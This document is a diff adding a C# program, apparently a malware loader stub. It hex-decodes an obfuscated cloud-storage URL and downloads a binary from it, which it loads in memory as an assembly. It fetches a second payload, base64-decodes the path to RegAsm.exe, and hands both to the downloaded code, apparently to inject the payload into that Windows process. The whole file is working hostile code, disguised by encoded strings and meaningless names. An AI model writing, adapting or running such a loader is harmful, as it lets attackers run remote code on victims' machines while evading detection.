@@ -1,0 +1,62 @@
+using System;
+using System.Net;
+using System.Reflection;
+using System.Text;
+
+namespace SSLNOW
+{
+
+    internal static class Program
+    {
+
+        [STAThread]
+        private static void Main()
+        {
+            ServicePointManager.Expect100Continue = true;
+
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+            WebClient D = new WebClient();
+
+            string llkxk = "68747470733a2f2f666972656261736573746f726167652e676f6f676c65617069732e636f6d2f76302f622f66646766646766646766642d31636465632e61707073706f742e636f6d2f6f2f7070706f2e62696e3f616c743d6d6564696126746f6b656e3d37383361653766322d323633622d343138382d386536382d336536376637653266356464";
+
+            Assembly A = Assembly.Load(D.DownloadData(XXX(llkxk)));
+
+            string bbnbn = "%anan%";
+
+            byte[] C = D.DownloadData(XXX(bbnbn));
+
+            byte[] aaaaaa = Convert.FromBase64String("QzpcXFdpbmRvd3NcXE1pY3Jvc29mdC5ORVRcXEZyYW1ld29ya1xcdjQuMC4zMDMxOVxcUmVnQXNtLmV4ZQ==");
+
+            string bbb = Encoding.UTF8.GetString(aaaaaa);
+
+            object B = new object[] { bbb, null, C, true };
+
+     
+            var bxax = BindingFlags.InvokeMethod;
+
+            string ooo = "tutorial.gya";
+
+            string llll = "empty";
+
+            A.GetType(ooo).InvokeMember(llll, bxax, null, null, (object[])B);
+        }
+
+
+        static string XXX(string xxxxx)
+        {
+            if (xxxxx == null || (xxxxx.Length & 1) == 1)
+            {
+                throw new ArgumentException();
+            }
+            var xxzz = new StringBuilder();
+            for (var i = 0; i < xxxxx.Length; i += 2)
+            {
+                var Cfnksk = xxxxx.Substring(i, 2);
+                xxzz.Append((char)Convert.ToByte(Cfnksk, 16));
+            }
+            return xxzz.ToString();
+        }
+
+    }
+}
